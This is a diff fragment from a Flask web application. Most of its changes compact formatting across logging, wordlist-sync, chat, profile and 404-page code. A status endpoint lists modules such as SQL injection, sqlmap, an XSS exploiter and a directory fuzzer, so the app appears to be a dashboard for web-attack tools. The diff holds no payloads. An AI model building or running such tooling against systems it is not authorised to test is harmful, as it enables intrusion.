+            ip=request.args.get("ip") or None,
         )
-        har = http_logger.to_har(listing["items"])
-        return jsonify(har)
+        return jsonify(http_logger.to_har(listing["items"]))
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
@@ -2611,15 +2540,10 @@ def api_logger_har():
 def api_logger_stream():
     if http_logger is None:
         return jsonify({"error": "http_logger not available"}), 503
-
     subscriber = http_logger.subscribe()
-
     def _gen():
         try:
-            yield _sse_format({
-                "type": "hello",
-                "stats": http_logger.stats(),
-            })
+            yield _sse_format({"type": "hello", "stats": http_logger.stats()})
             last_heartbeat = time.monotonic()
             while True:
                 try:
@@ -2635,7 +2559,6 @@ def api_logger_stream():
             pass
         finally:
             http_logger.unsubscribe(subscriber)
-
     return _sse_response(_gen())
 
 
@@ -2674,13 +2597,11 @@ def api_wordlists_sync():
     modules = data.get("modules")
     if isinstance(modules, str):
         modules = [m.strip() for m in modules.split(",") if m.strip()]
-    force   = bool(data.get("force", False))
+    force = bool(data.get("force", False))
     workers = int(data.get("workers", 4))
     timeout = float(data.get("timeout", 25.0))
     try:
-        report = wordlist_sync(modules, force=force,
-                               workers=workers, timeout=timeout)
-        return jsonify(report)
+        return jsonify(wordlist_sync(modules, force=force, workers=workers, timeout=timeout))
     except Exception as e:
         logger.error(f"wordlist sync failed: {e}", exc_info=True)
         return jsonify({"error": "sync_failed", "detail": str(e)}), 500
@@ -2691,20 +2612,16 @@ def api_wordlists_sync():
 def api_wordlists_sync_stream():
     if not _wordlist_scraper_available:
         return jsonify({"error": "wordlist scraper not available"}), 503
-
     mod_arg = request.args.get("modules", "").strip()
     modules = [m.strip() for m in mod_arg.split(",") if m.strip()] or None
-    force   = request.args.get("force", "0") == "1"
+    force = request.args.get("force", "0") == "1"
     workers = int(request.args.get("workers", 4))
     timeout = float(request.args.get("timeout", 25.0))
-
     cancel_event = threading.Event()
-
     def _gen():
         try:
             for ev in wordlist_sync_stream(
-                modules, force=force,
-                workers=workers, timeout=timeout,
+                modules, force=force, workers=workers, timeout=timeout,
                 cancel_event=cancel_event,
             ):
                 yield _sse_format(ev)
@@ -2713,7 +2630,6 @@ def api_wordlists_sync_stream():
         except Exception as e:
             logger.error(f"wordlist stream failed: {e}", exc_info=True)
             yield _sse_format({"type": "error", "message": str(e)})
-
     return _sse_response(_gen())
 
 
@@ -2776,48 +2692,28 @@ def page_not_found(e):
             to { opacity: 1; transform: translateY(0); }
         }
         .center-content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            flex: 1;
-            animation: fadeIn 1.5s ease-out;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; flex: 1; animation: fadeIn 1.5s ease-out;
         }
         .username {
-            font-size: 0.9rem;
-            letter-spacing: 0.2em;
-            color: #aaaaaa;
-            text-transform: uppercase;
-            margin-bottom: 10px;
+            font-size: 0.9rem; letter-spacing: 0.2em; color: #aaaaaa;
+            text-transform: uppercase; margin-bottom: 10px;
         }
         .main-title {
-            font-size: clamp(1.2rem, 3.5vw, 2.5rem);
-            font-weight: 300;
-            letter-spacing: 0.35em;
-            text-align: center;
-            text-transform: uppercase;
-            color: #ffffff;
-            text-shadow: 0 0 30px rgba(255,255,255,0.15);
+            font-size: clamp(1.2rem, 3.5vw, 2.5rem); font-weight: 300;
+            letter-spacing: 0.35em; text-align: center; text-transform: uppercase;
+            color: #ffffff; text-shadow: 0 0 30px rgba(255,255,255,0.15);
         }
         .sad-face {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 0px;
-            margin-top: 25px;
-            font-size: clamp(1.5rem, 5vw, 3rem);
-            color: #ffffff;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; gap: 0px; margin-top: 25px;
+            font-size: clamp(1.5rem, 5vw, 3rem); color: #ffffff;
             text-shadow: 0 0 20px rgba(255,255,255,0.2);
-            animation: slightFloat 3s ease-in-out infinite;
-            line-height: 0.45;
+            animation: slightFloat 3s ease-in-out infinite; line-height: 0.45;
         }
-        .sleep-colon,
-        .sleep-mouth {
-            display: inline-block;
-            transform: rotate(90deg);
-            transform-origin: center;
-            animation: breathe 2.5s ease-in-out infinite;
+        .sleep-colon, .sleep-mouth {
+            display: inline-block; transform: rotate(90deg);
+            transform-origin: center; animation: breathe 2.5s ease-in-out infinite;
         }
         .sleep-mouth { margin-top: -0.1em; }
         @keyframes breathe {
@@ -2829,26 +2725,16 @@ def page_not_found(e):
             50% { transform: translateY(-5px); }
         }
         .bottom-bar {
-            position: absolute;
-            bottom: 20px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            padding: 15px;
-            animation: fadeIn 2s ease-out;
+            position: absolute; bottom: 20px; left: 0; right: 0;
+            text-align: center; padding: 15px; animation: fadeIn 2s ease-out;
         }
         .url-not-found {
-            font-size: 0.8rem;
-            letter-spacing: 0.25em;
-            color: #888888;
-            text-transform: uppercase;
+            font-size: 0.8rem; letter-spacing: 0.25em;
+            color: #888888; text-transform: uppercase;
         }
         .url-address {
-            font-size: 0.7rem;
-            letter-spacing: 0.1em;
-            color: #aaaaaa;
-            margin-top: 8px;
-            word-break: break-all;
+            font-size: 0.7rem; letter-spacing: 0.1em; color: #aaaaaa;
+            margin-top: 8px; word-break: break-all;
         }
     </style>
 </head>
@@ -2883,11 +2769,9 @@ def server_name():
     if request.method == 'GET':
         settings = _load_json('settings', {})
         return jsonify({'name': settings.get('server_name', '')})
-
     u = current_user()
     if u and u.get('role') != 'owner':
         return jsonify({'error': 'Owner access required'}), 403
-
     body = request.get_json(silent=True) or {}
     with _json_lock('settings'):
         settings = _load_json('settings', {})
@@ -2913,16 +2797,13 @@ def profile_photo():
     if not u:
         return jsonify({'error': 'Not authenticated'}), 401
     body = request.get_json(silent=True) or {}
-
     with _json_lock('profiles'):
         profiles = _load_json('profiles', {})
         profile = profiles.setdefault(u['username'], {})
-
         if body.get('remove'):
             profile['avatar_url'] = None
             _save_json('profiles', profiles)
             return jsonify({'ok': True, 'avatar_url': None})
-
         if body.get('url'):
             url = body['url'].strip()
             if not (url.startswith('http://') or url.startswith('https://')):
@@ -2930,7 +2811,6 @@ def profile_photo():
             profile['avatar_url'] = url
             _save_json('profiles', profiles)
             return jsonify({'ok': True, 'avatar_url': url})
-
         if body.get('image_base64'):
             data_url = body['image_base64']
             try:
@@ -2950,7 +2830,6 @@ def profile_photo():
                 return jsonify({'ok': True, 'avatar_url': profile['avatar_url']})
             except (ValueError, binascii.Error):
                 return jsonify({'error': 'Could not decode that image.'}), 400
-
     return jsonify({'error': 'Provide image_base64, url, or remove:true.'}), 400
 
 
@@ -3006,29 +2885,22 @@ def chat_send():
     u = current_user()
     if not u:
         return jsonify({'error': 'Not authenticated'}), 401
-
     body = request.get_json(silent=True) or {}
     text = (body.get('text') or '').strip()
     if not text:
         return jsonify({'error': 'Message text is required.'}), 400
     text = text[:500]
-
     with _json_lock('chat'):
         chat = _load_json('chat', {'messages': [], 'locked': False})
         if chat.get('locked') and u.get('role') != 'owner':
             return jsonify({'error': 'Chat is locked by the Owner.'}), 423
-
         message = {
-            'id': uuid.uuid4().hex,
-            'username': u['username'],
-            'role': u['role'],
-            'text': text,
-            'timestamp': _now_iso(),
+            'id': uuid.uuid4().hex, 'username': u['username'],
+            'role': u['role'], 'text': text, 'timestamp': _now_iso(),
         }
         chat['messages'].append(message)
         chat['messages'] = chat['messages'][-CHAT_HISTORY_LIMIT:]
         _save_json('chat', chat)
-
     return jsonify({'ok': True, 'id': message['id']})
 
 
@@ -3040,8 +2912,7 @@ def chat_lock():
         chat = _load_json('chat', {'messages': [], 'locked': False})
         chat['locked'] = bool(body.get('locked'))
         chat['messages'].append({
-            'id': uuid.uuid4().hex,
-            'is_system': True,
+            'id': uuid.uuid4().hex, 'is_system': True,
             'text': f'{session.get("username")} {"locked" if chat["locked"] else "unlocked"} Global Chat.',
             'timestamp': _now_iso(),
         })
@@ -3110,18 +2981,18 @@ def v1_scan_status(job_id):
 @api_login_required
 def api_modules_status():
     return jsonify({
-        "dirfuzz":           {"available": _dirfuzz_available},
-        "sqli_engine":       {"available": _sqli_engine_available,
-                              "sources": list(SQLI_WORDLIST_SOURCES.keys()) if _sqli_engine_available else []},
-        "sql_map":           {"available": _sql_map_available},
-        "sql_injection":     {"available": _sql_injection_available},
-        "xss_exploiter":     {"available": _xss_exploiter_available},
-        "xss":               {"available": _xss_available},
-        "sniper":            {"available": _sniper_available},
-        "http_logger":       {"available": http_logger is not None},
-        "wordlist_scraper":  {"available": _wordlist_scraper_available},
-        "analytic":          {"available": _analytic_available},
-        "downsea":           {"available": _downsea_available},
+        "dirfuzz":          {"available": _dirfuzz_available},
+        "sqli_engine":      {"available": _sqli_engine_available,
+                             "sources": list(SQLI_WORDLIST_SOURCES.keys()) if _sqli_engine_available else []},
+        "sql_map":          {"available": _sql_map_available},
+        "sql_injection":    {"available": _sql_injection_available},
+        "xss_exploiter":    {"available": _xss_exploiter_available},
+        "xss":              {"available": _xss_available},
+        "sniper":           {"available": _sniper_available},
+        "http_logger":      {"available": http_logger is not None},
+        "wordlist_scraper": {"available": _wordlist_scraper_available},
+        "analytic":         {"available": _analytic_available},
+        "downsea":          {"available": _downsea_available},
     })
 
 
@@ -3129,7 +3000,6 @@ def api_modules_status():
 # Startup banner helper
 # ═══════════════════════════════════════════════════════════════════════════
 def _print_startup(port=None):
-    """Single clean startup banner — no ==== separators, no module spam."""
     print(BANNER, flush=True)
     info_lines = []
     if port is not None:
@@ -3180,7 +3050,6 @@ if __name__ == "__main__":
 
     auto_restart_bot()
 
-    # Render / Heroku / Railway provide $PORT — honour it.
     env_port = os.getenv("PORT")
     if env_port:
         port = int(env_port)
